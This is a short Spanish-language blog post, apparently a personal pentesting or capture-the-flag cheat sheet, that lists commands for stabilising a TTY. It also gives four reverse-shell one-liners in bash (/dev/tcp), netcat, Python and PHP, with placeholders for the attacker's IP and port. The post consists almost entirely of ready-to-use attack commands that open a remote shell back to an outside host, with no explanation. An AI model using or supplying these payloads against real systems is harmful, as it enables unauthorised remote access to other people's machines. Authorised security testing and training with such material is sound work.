---
title: Utilidades
date: 2024-09-01
description: Post con recursos generales.
categories:
    - Utilities
tags:
    - Utilities
media_subpath: /assets/img/commons/Utilities/
# image:
---

## Tratamiento de la tty

```bash
script /dev/null -c bash
(Ctrl + Z)
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 44 cols 184
```

## Reverse Shell Linux

```bash
bash -i >& /dev/tcp/{IP}/{PUERTO} 0>&1
```

## Reverse Shell Netcat

```bash
nc -e /bin/sh {IP} {PUERTO}
```

## Reverse Shell Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PUERTO}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Reverse Shell PHP

```bash
php -r '$sock=fsockopen("{IP}",{PUERTO});exec("/bin/sh -i <&3 >&3 2>&3");'
```
